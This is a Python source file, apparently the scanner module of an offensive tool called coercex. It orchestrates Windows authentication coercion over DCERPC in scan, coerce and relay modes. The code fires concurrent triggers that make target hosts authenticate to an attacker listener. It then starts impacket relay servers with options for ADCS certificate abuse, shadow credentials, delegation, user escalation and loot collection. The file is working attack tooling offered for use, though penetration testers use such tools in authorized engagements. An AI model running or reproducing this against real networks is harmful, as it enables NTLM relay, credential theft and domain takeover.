"""Scan / coerce / relay orchestrator.

Ties together the DCERPC connection pool, async listener, and method
registry into a high-performance concurrent pipeline.

Three modes:
  - scan:   Tries all path styles per method to detect vulnerabilities.
            Always starts HTTP + SMB listeners on 0.0.0.0.  If ``-l``
            is not given, the listener IP is auto-detected from the
            default network route.
  - coerce: Fires coercion triggers with UNC paths pointing at an
            **external** relay (e.g. ntlmrelayx) that the operator
            already started.  ``-l`` is required so we know where to
            point the paths, but coercex does **not** bind any port.
  - relay:  Like scan thoroughness but with impacket relay servers
            started by coercex.  ``-l`` is optional — auto-detected
            from the default route when omitted.
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console

from coercex.connection import DCERPCPool, trigger_method
from coercex.listener import AsyncListener
from coercex.methods import get_all_methods
from coercex.methods.base import CoercionMethod, PipeBinding
from coercex.relay import RelayConfig, RelayManager
from coercex.utils import (
    Credentials,
    ScanResult,
    ScanStats,
    Transport,
    TriggerResult,
    build_unc_path,
    get_local_ip,
    random_string,
)

log = logging.getLogger("coercex.scanner")

# ── Rich status styling ─────────────────────────────────────────────
_STATUS_STYLE = {
    TriggerResult.VULNERABLE: ("bold green", "[+]"),
    TriggerResult.ACCESSIBLE: ("yellow", "[~]"),
    TriggerResult.ACCESS_DENIED: ("red", "[-]"),
    TriggerResult.NOT_AVAILABLE: ("dim", "[ ]"),
    TriggerResult.CONNECT_ERROR: ("bold red", "[!]"),
    TriggerResult.TIMEOUT: ("magenta", "[T]"),
    TriggerResult.UNKNOWN_ERROR: ("dim red", "[?]"),
}


class Mode(Enum):
    SCAN = auto()
    COERCE = auto()
    RELAY = auto()


@dataclass
class ScanConfig:
    """Configuration for a scan run."""

    targets: list[str]
    mode: Mode = Mode.SCAN
    protocols: list[str] | None = None
    methods_filter: list[str] | None = None  # Glob/regex patterns for method names
    pipes_filter: list[str] | None = None  # Pipe names to restrict to
    creds: Credentials | None = None
    listener_host: str = ""  # Attacker IP (empty = no listener)
    http_port: int = 80
    smb_port: int = 445
    transport: set[Transport] = field(
        default_factory=lambda: {Transport.SMB, Transport.HTTP}
    )
    concurrency: int = 50
    timeout: int = 5
    callback_timeout: float = 3.0
    verbose: bool = False

    # Relay mode settings
    relay_targets: list[str] | None = None
    relay_adcs: bool = False
    relay_adcs_template: str = ""
    relay_altname: str = ""
    relay_shadow_credentials: bool = False
    relay_shadow_target: str = ""
    relay_delegate_access: bool = False
    relay_escalate_user: str = ""
    relay_socks: bool = False
    relay_lootdir: str = ""

    @property
    def has_listener(self) -> bool:
        """Whether a listener IP was provided."""
        return bool(self.listener_host)


class Scanner:
    """Orchestrates the coercion pipeline.

    Usage:
        scanner = Scanner(config)
        stats = await scanner.run()
    """

    def __init__(self, config: ScanConfig, console: Console | None = None):
        self.config = config
        self.console = console or Console(stderr=True)
        self.stats = ScanStats()
        self._pool: DCERPCPool | None = None
        self._listener: AsyncListener | None = None
        self._relay: RelayManager | None = None
        self._semaphore = asyncio.Semaphore(config.concurrency)

    async def run(self) -> ScanStats:
        """Execute the scan and return aggregate stats."""
        creds = self.config.creds or Credentials()
        self._pool = DCERPCPool(creds, timeout=self.config.timeout)

        methods = get_all_methods(
            protocols=self.config.protocols,
            methods_filter=self.config.methods_filter,
            pipes_filter=self.config.pipes_filter,
        )
        if not methods:
            log.error("No methods matched filters")
            return self.stats

        self.stats.total_targets = len(self.config.targets)

        self.console.print(
            f"[bold cyan]coercex[/] | mode=[bold]{self.config.mode.name.lower()}[/] "
            f"targets=[bold]{len(self.config.targets)}[/] methods=[bold]{len(methods)}[/] "
            f"concurrency=[bold]{self.config.concurrency}[/]"
        )

        # ── Scan mode: always start listener (auto-detect IP if needed) ─
        if self.config.mode == Mode.SCAN:
            if not self.config.listener_host:
                self.config.listener_host = get_local_ip()
                self.console.print(
                    f"[dim]Auto-detected listener IP: "
                    f"[bold]{self.config.listener_host}[/][/]"
                )
            self._listener = AsyncListener(
                host="0.0.0.0",
                http_port=self.config.http_port,
                smb_port=self.config.smb_port,
                enable_http=True,
                enable_smb=True,
            )
            await self._listener.start()
            self.console.print(
                f"[green]Listener started[/] "
                f"(http={self.config.http_port}, smb={self.config.smb_port})"
            )

        # ── Coerce mode: NO listener — targets point at external relay ─
        if self.config.mode == Mode.COERCE:
            if not self.config.has_listener:
                log.error("Coerce mode requires --listener (IP of your running relay)")
                return self.stats
            self.console.print(
                f"[yellow]Coerce mode[/] — triggers point at "
                f"[bold]{self.config.listener_host}[/] "
                f"(no local listener; assumes external relay is running)"
            )

        # ── Relay mode: start relay servers, auto-detect IP if needed ──
        if self.config.mode == Mode.RELAY:
            if not self.config.listener_host:
                self.config.listener_host = get_local_ip()
                self.console.print(
                    f"[dim]Auto-detected listener IP: "
                    f"[bold]{self.config.listener_host}[/][/]"
                )
            if not self.config.relay_targets:
                log.error("Relay target(s) required for relay mode (--relay-to)")
                return self.stats

            relay_cfg = RelayConfig(
                relay_targets=self.config.relay_targets,
                interface_ip=self.config.listener_host,
                http_port=self.config.http_port,
                smb_port=self.config.smb_port,
                adcs=self.config.relay_adcs,
                adcs_template=self.config.relay_adcs_template,
                altname=self.config.relay_altname,
                shadow_credentials=self.config.relay_shadow_credentials,
                shadow_target=self.config.relay_shadow_target,
                delegate_access=self.config.relay_delegate_access,
                escalate_user=self.config.relay_escalate_user,
                socks=self.config.relay_socks,
                lootdir=self.config.relay_lootdir,
            )
            self._relay = RelayManager(relay_cfg)
            self._relay.start()
            self.console.print(
                f"[green]Relay servers started[/] -> "
                f"{', '.join(self.config.relay_targets)}"
            )

        try:
            if self.config.mode == Mode.SCAN:
                await self._run_scan(methods)
            elif self.config.mode == Mode.COERCE:
                await self._run_coerce(methods)
            elif self.config.mode == Mode.RELAY:
                await self._run_relay(methods)
        finally:
            if self._pool:
                await self._pool.close_all()
            if self._listener:
                await self._listener.stop()
            if self._relay:
                self._relay.stop()

        return self.stats

    # ── SCAN: all path styles (fuzz-like thoroughness) ──────────────

    async def _run_scan(self, methods: list[CoercionMethod]) -> None:
        """Scan mode: try all path styles per method to detect vulnerabilities."""
        allowed = self.config.transport
        tasks: list[asyncio.Task[None]] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport_name, path_style in method.path_styles:
                        transport = (
                            Transport.HTTP
                            if transport_name == "http"
                            else Transport.SMB
                        )
                        if transport not in allowed:
                            continue
                        task = asyncio.create_task(
                            self._attempt(
                                target,
                                method,
                                binding,
                                transport_override=transport,
                                path_style_override=path_style,
                            )
                        )
                        tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    # ── COERCE: targeted single-path triggers (no local listener) ──

    async def _run_coerce(self, methods: list[CoercionMethod]) -> None:
        """Coerce mode: fire each method once per transport, pointing at external relay."""
        tasks: list[asyncio.Task[None]] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport in self.config.transport:
                        task = asyncio.create_task(
                            self._attempt_coerce(target, method, binding, transport)
                        )
                        tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _attempt_coerce(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport: Transport,
    ) -> None:
        """Single coerce trigger — no listener, fire and report."""
        pool = self._pool
        assert pool is not None
        async with self._semaphore:
            port = (
                self.config.http_port
                if transport == Transport.HTTP
                else self.config.smb_port
            )
            token = random_string(12)
            path = build_unc_path(
                self.config.listener_host,
                token,
                transport,
                port=port,
                path_style="share_file",
            )

            result = await trigger_method(pool, target, method, binding, path)
            self.stats.add(result)
            self._emit(result)

    # ── RELAY: all path styles through relay servers ─────────────────

    async def _run_relay(self, methods: list[CoercionMethod]) -> None:
        """Relay mode: try all path styles, relay servers handle NTLM auth."""
        allowed = self.config.transport
        tasks: list[asyncio.Task[None]] = []

        for target in self.config.targets:
            for method in methods:
                for binding in method.pipe_bindings:
                    for transport_name, path_style in method.path_styles:
                        transport = (
                            Transport.HTTP
                            if transport_name == "http"
                            else Transport.SMB
                        )
                        if transport not in allowed:
                            continue
                        task = asyncio.create_task(
                            self._attempt_relay(
                                target, method, binding, transport, path_style
                            )
                        )
                        tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _attempt_relay(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport: Transport,
        path_style: str,
    ) -> None:
        """Single relay trigger attempt — fire through relay servers."""
        async with self._semaphore:
            port = (
                self.config.http_port
                if transport == Transport.HTTP
                else self.config.smb_port
            )
            token = random_string(12)
            path = build_unc_path(
                self.config.listener_host,
                token,
                transport,
                port=port,
                path_style=path_style,
            )

            assert self._pool is not None
            result = await trigger_method(self._pool, target, method, binding, path)
            self.stats.add(result)
            self._emit(result)

    # ── Core attempt logic (scan mode) ────────────────────────────

    async def _attempt(
        self,
        target: str,
        method: CoercionMethod,
        binding: PipeBinding,
        transport_override: Transport | None = None,
        path_style_override: str | None = None,
    ) -> None:
        """Single trigger attempt, bounded by semaphore."""
        pool = self._pool
        assert pool is not None
        async with self._semaphore:
            transport = transport_override or Transport.SMB
            path_style = path_style_override or "share_file"

            use_listener = self.config.has_listener and self._listener is not None

            if not use_listener:
                # No listener: dummy path, classify errors only
                path = build_unc_path(
                    "127.0.0.1", "coercexscan", transport, path_style=path_style
                )
                result = await trigger_method(pool, target, method, binding, path)
            else:
                # Listener active: real path with correlation token
                listener = self._listener
                assert listener is not None
                token, future = listener.create_token()

                port = (
                    self.config.http_port
                    if transport == Transport.HTTP
                    else self.config.smb_port
                )
                path = build_unc_path(
                    self.config.listener_host,
                    token,
                    transport,
                    port=port,
                    path_style=path_style,
                )

                result = await trigger_method(pool, target, method, binding, path)

                # Wait for callback if trigger indicated vulnerability
                if result.result in (
                    TriggerResult.VULNERABLE,
                    TriggerResult.ACCESSIBLE,
                ):
                    try:
                        callback = await asyncio.wait_for(
                            future, timeout=self.config.callback_timeout
                        )
                        result.callback_received = True
                        result.source_ip = callback.source_ip
                        result.result = TriggerResult.VULNERABLE
                    except asyncio.TimeoutError:
                        pass
                else:
                    listener.cancel_token(token)

            self.stats.add(result)
            self._emit(result)

    def _emit(self, result: ScanResult) -> None:
        """Print a result line (only for interesting results unless verbose)."""
        if self.config.verbose or result.result in (
            TriggerResult.VULNERABLE,
            TriggerResult.ACCESSIBLE,
        ):
            style, sym = _STATUS_STYLE.get(result.result, ("dim red", "[?]"))
            cb = " [bold green](callback!)[/]" if result.callback_received else ""
            self.console.print(
                f"[{style}]{sym}[/] {result.target} | "
                f"[blue]{result.protocol}[/]::{result.method} "
                f"via [dim]{result.pipe}[/]{cb}"
            )
